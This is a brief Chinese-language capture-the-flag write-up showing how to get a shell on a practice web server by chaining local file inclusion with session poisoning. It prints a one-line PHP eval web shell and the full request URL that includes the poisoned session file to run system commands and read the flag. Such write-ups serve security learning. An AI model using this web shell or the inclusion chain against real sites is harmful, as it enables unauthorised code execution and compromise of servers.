http://splitline.tw:8401

這題是使用寫入一句話木馬在session裡面
然後再用include 去執行這個session的file,就可以得到shell了

首先觀察session怎麼存資訊的,隨便打一些字在框框裡面案送出
可以發現http://splitline.tw:8401/?module=module/post.php
很明顯看得出來有使用include
這樣我們就可以使用LFI得到post.php 的原始碼
觀察session的寫入,其實就是在框框裡面打的字
回去再框框裡面寫入木馬<?php eval($_GET['code']); ?>
http://splitline.tw:8401/?module=/tmp/sess_d8b039c542cdf167bd50335843312ccb&&code=system(%27cd%20/;ls%20-la;cat%20flag_aff6136bbef82137%27);
得到flag